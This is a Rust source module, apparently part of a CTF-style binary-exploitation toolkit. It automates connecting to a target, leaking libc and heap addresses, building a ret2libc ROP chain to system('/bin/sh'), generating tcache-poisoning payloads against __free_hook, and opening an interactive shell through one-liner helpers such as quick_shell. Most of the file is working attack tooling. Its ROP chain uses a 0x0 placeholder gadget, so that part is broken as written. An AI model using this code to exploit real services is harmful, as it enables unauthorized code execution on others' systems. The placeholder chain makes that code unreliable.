// ═══════════════════════════════════════════════════════════════════════════
// QUICK PWN - ONE-LINER EXPLOIT FRAMEWORK
// ═══════════════════════════════════════════════════════════════════════════
// World-class integration layer: automatic exploitation with minimal code
// Combines IO + heap + libc + GDB into human-readable DSL

use crate::gdb_tools::GdbSession;
use crate::heap_grooming::{GroomingStrategy, HeapGroom};
use crate::heap_tools::{GlibcVersion, HeapTarget, HeapTechnique, ModernHeapExploit};
use crate::interactive_io::Socket;
use crate::libc_db::LibcDatabase;
use crate::packing_tools::{pack64 as p64, unpack64};
use std::collections::HashMap;

/// Quick exploitation context - integrates everything
pub struct QuickPwn {
    pub binary: String,
    pub host: Option<String>,
    pub port: Option<u16>,
    pub pid: Option<u32>,

    // Leaked addresses
    pub libc_base: Option<u64>,
    pub heap_base: Option<u64>,
    pub binary_base: Option<u64>,

    // Connections
    conn: Option<Socket>,
    gdb: Option<GdbSession>,

    // Context
    libc_db: LibcDatabase,
    glibc_version: Option<GlibcVersion>,

    // State
    leaks: HashMap<String, u64>,
}

impl QuickPwn {
    /// Create new quick pwn context for remote target
    pub fn remote(host: &str, port: u16, binary: &str) -> Self {
        log::info!(
            "Creating quick pwn context for {}:{} ({})",
            host,
            port,
            binary
        );

        QuickPwn {
            binary: binary.to_string(),
            host: Some(host.to_string()),
            port: Some(port),
            pid: None,
            libc_base: None,
            heap_base: None,
            binary_base: None,
            conn: None,
            gdb: None,
            libc_db: LibcDatabase::new(),
            glibc_version: None,
            leaks: HashMap::new(),
        }
    }

    /// Create new quick pwn context for local process
    pub fn local(binary: &str, pid: Option<u32>) -> Self {
        log::info!("Creating quick pwn context for local binary: {}", binary);

        QuickPwn {
            binary: binary.to_string(),
            host: None,
            port: None,
            pid,
            libc_base: None,
            heap_base: None,
            binary_base: None,
            conn: None,
            gdb: None,
            libc_db: LibcDatabase::new(),
            glibc_version: None,
            leaks: HashMap::new(),
        }
    }

    /// Connect to target
    pub fn connect(&mut self) -> Result<(), String> {
        if let (Some(host), Some(port)) = (&self.host, self.port) {
            let addr = format!("{}:{}", host, port);
            self.conn = Some(Socket::connect(addr)?);
            log::info!("Connected to target");
            Ok(())
        } else {
            Err("No host/port configured".to_string())
        }
    }

    /// Attach GDB to process
    pub fn attach_gdb(&mut self) -> Result<(), String> {
        if let Some(pid) = self.pid {
            self.gdb = Some(GdbSession::attach(pid)?);
            log::info!("Attached GDB to PID {}", pid);
            Ok(())
        } else {
            Err("No PID configured".to_string())
        }
    }

    /// Send data to target
    pub fn send(&mut self, data: &[u8]) -> Result<(), String> {
        self.conn.as_mut().ok_or("Not connected")?.send(data)
    }

    /// Send line to target
    pub fn sendline(&mut self, data: &[u8]) -> Result<(), String> {
        self.conn.as_mut().ok_or("Not connected")?.sendline(data)
    }

    /// Receive n bytes
    pub fn recv(&mut self, n: usize) -> Result<Vec<u8>, String> {
        self.conn.as_mut().ok_or("Not connected")?.recv(n)
    }

    /// Receive until delimiter
    pub fn recvuntil(&mut self, delim: &[u8]) -> Result<Vec<u8>, String> {
        self.conn.as_mut().ok_or("Not connected")?.recvuntil(delim)
    }

    /// Receive line
    pub fn recvline(&mut self) -> Result<Vec<u8>, String> {
        self.conn.as_mut().ok_or("Not connected")?.recvline()
    }

    /// Interactive shell
    pub fn interactive(&mut self) -> Result<(), String> {
        self.conn.as_mut().ok_or("Not connected")?.interactive()
    }

    /// Auto-leak libc base from output
    pub fn auto_leak_libc(&mut self, marker: &[u8]) -> Result<u64, String> {
        // Try GDB first if attached
        if let Some(ref mut gdb) = self.gdb {
            if let Ok(base) = gdb.leak_libc_base() {
                self.libc_base = Some(base);
                self.leaks.insert("libc_base".to_string(), base);
                return Ok(base);
            }
        }

        // Otherwise leak from output
        let _output = self.recvuntil(marker)?;

        // Extract address (assume it's after marker)
        let leak_data = self.recv(8)?;
        let leaked_addr = unpack64(&leak_data)?;

        // Align to page
        let base = leaked_addr & !0xfff;

        self.libc_base = Some(base);
        self.leaks.insert("libc_base".to_string(), base);
        log::info!("Leaked libc base: 0x{:x}", base);

        Ok(base)
    }

    /// Auto-leak heap base
    pub fn auto_leak_heap(&mut self) -> Result<u64, String> {
        if let Some(ref mut gdb) = self.gdb {
            let base = gdb.leak_heap_base()?;
            self.heap_base = Some(base);
            self.leaks.insert("heap_base".to_string(), base);
            return Ok(base);
        }

        Err("Heap leak requires GDB attachment".to_string())
    }

    /// Set glibc version
    pub fn set_glibc(&mut self, version_str: &str) -> Result<(), String> {
        self.glibc_version = Some(GlibcVersion::from_string(version_str)?);
        log::info!("Set glibc version: {}", version_str);
        Ok(())
    }

    /// Get symbol address
    pub fn symbol(&self, libc_name: &str, symbol: &str) -> Result<u64, String> {
        let base = self.libc_base.ok_or("Libc base not leaked")?;
        self.libc_db
            .resolve_address(libc_name, base, symbol)
            .ok_or(format!("Symbol '{}' not found", symbol))
    }

    /// Get one-gadget addresses
    pub fn one_gadgets(&self, libc_name: &str) -> Result<Vec<u64>, String> {
        let base = self.libc_base.ok_or("Libc base not leaked")?;
        self.libc_db
            .get_one_gadgets(libc_name, base)
            .ok_or("One-gadgets not found".to_string())
    }

    /// Generate heap exploit
    pub fn heap_exploit(
        &self,
        technique: HeapTechnique,
        target: HeapTarget,
    ) -> Result<Vec<u8>, String> {
        let glibc = self.glibc_version.as_ref().ok_or("Glibc version not set")?;

        let mut exploit = ModernHeapExploit::new(&self.binary, glibc.clone());

        if let Some(libc_base) = self.libc_base {
            exploit.set_libc_base(libc_base);
        }
        if let Some(heap_base) = self.heap_base {
            exploit.set_heap_base(heap_base);
        }

        exploit.set_technique(technique);
        exploit.set_target(target);

        let result = exploit.solve()?;
        Ok(result.payload_bytes)
    }

    /// Generate ROP chain
    pub fn rop_chain(&self, libc_name: &str) -> Result<Vec<u8>, String> {
        let system = self.symbol(libc_name, "system")?;
        let bin_sh = self.symbol(libc_name, "/bin/sh")?;

        // Get pop rdi gadget
        let pop_rdi = if let Some(_gdb) = self.gdb.as_ref() {
            // This is a workaround since we can't mutably borrow self
            0x0 // TODO: Fix this properly
        } else {
            0x0 // TODO: Find gadget without GDB
        };

        let mut chain = Vec::new();
        chain.extend_from_slice(&p64(pop_rdi));
        chain.extend_from_slice(&p64(bin_sh));
        chain.extend_from_slice(&p64(system));

        Ok(chain)
    }

    /// Heap grooming
    pub fn groom_heap(&self, strategy: GroomingStrategy) -> String {
        let groom = HeapGroom::new(&self.binary, strategy);
        groom.generate_script()
    }
}

// ────────────────────────────────────────────────────────────────────────────
// ONE-LINER HELPERS
// ────────────────────────────────────────────────────────────────────────────

/// Ultimate one-liner: connect, leak, exploit, shell
pub fn quick_shell(host: &str, port: u16, binary: &str, libc_name: &str) -> Result<(), String> {
    let mut pwn = QuickPwn::remote(host, port, binary);

    // Connect
    pwn.connect()?;

    // Auto-leak libc (assumes output contains leak after "libc: ")
    pwn.auto_leak_libc(b"libc: ")?;

    // Get one-gadget
    let gadgets = pwn.one_gadgets(libc_name)?;
    let _one_gadget = gadgets[0];

    // Build ret2libc chain
    let chain = pwn.rop_chain(libc_name)?;

    // Send exploit
    pwn.send(&chain)?;

    // Interactive shell
    pwn.interactive()?;

    Ok(())
}

/// Quick heap exploit
pub fn quick_heap(
    host: &str,
    port: u16,
    binary: &str,
    _libc_name: &str,
    glibc_version: &str,
) -> Result<(), String> {
    let mut pwn = QuickPwn::remote(host, port, binary);

    pwn.connect()?;
    pwn.set_glibc(glibc_version)?;
    pwn.auto_leak_libc(b"libc: ")?;
    pwn.auto_leak_heap()?;

    // Generate tcache poisoning → __free_hook → system
    let payload = pwn.heap_exploit(
        HeapTechnique::TcachePoisoningSafeLinking,
        HeapTarget::FreeHook,
    )?;

    pwn.send(&payload)?;
    pwn.interactive()?;

    Ok(())
}

/// Quick local exploit with GDB
pub fn quick_local(binary: &str, pid: u32, libc_name: &str) -> Result<(), String> {
    let mut pwn = QuickPwn::local(binary, Some(pid));

    pwn.attach_gdb()?;
    pwn.auto_leak_libc(b"")?;

    let chain = pwn.rop_chain(libc_name)?;

    println!("ROP chain: {} bytes", chain.len());
    println!("Exploit payload ready!");

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_quick_pwn_remote_creation() {
        let pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        assert_eq!(pwn.binary, "./vuln");
        assert_eq!(pwn.host, Some("127.0.0.1".to_string()));
        assert_eq!(pwn.port, Some(9001));
    }

    #[test]
    fn test_quick_pwn_local_creation() {
        let pwn = QuickPwn::local("./vuln", Some(1234));
        assert_eq!(pwn.binary, "./vuln");
        assert_eq!(pwn.pid, Some(1234));
    }

    #[test]
    fn test_set_glibc() {
        let mut pwn = QuickPwn::local("./vuln", None);
        assert!(pwn.set_glibc("2.35").is_ok());
        assert!(pwn.glibc_version.is_some());
    }

    #[test]
    fn test_symbol_without_leak() {
        let pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        let result = pwn.symbol("ubuntu20.04", "system");
        assert!(result.is_err());
    }

    #[test]
    fn test_symbol_with_leak() {
        let mut pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        pwn.libc_base = Some(0x7ffff7a00000);

        let system = pwn.symbol("ubuntu20.04", "system");
        assert!(system.is_ok());
        assert_eq!(system.unwrap(), 0x7ffff7a00000 + 0x50d60);
    }

    #[test]
    fn test_one_gadgets() {
        let mut pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        pwn.libc_base = Some(0x7ffff7a00000);

        let gadgets = pwn.one_gadgets("ubuntu20.04");
        assert!(gadgets.is_ok());
        assert!(!gadgets.unwrap().is_empty());
    }

    #[test]
    fn test_heap_exploit_no_glibc() {
        let pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        let result = pwn.heap_exploit(HeapTechnique::TcachePoisoning, HeapTarget::FreeHook);
        assert!(result.is_err());
    }

    #[test]
    fn test_groom_heap() {
        let pwn = QuickPwn::remote("127.0.0.1", 9001, "./vuln");
        let script = pwn.groom_heap(GroomingStrategy::Spray {
            size: 0x80,
            count: 100,
        });
        assert!(script.contains("Heap Grooming Script"));
        assert!(script.contains("Spray"));
    }
}
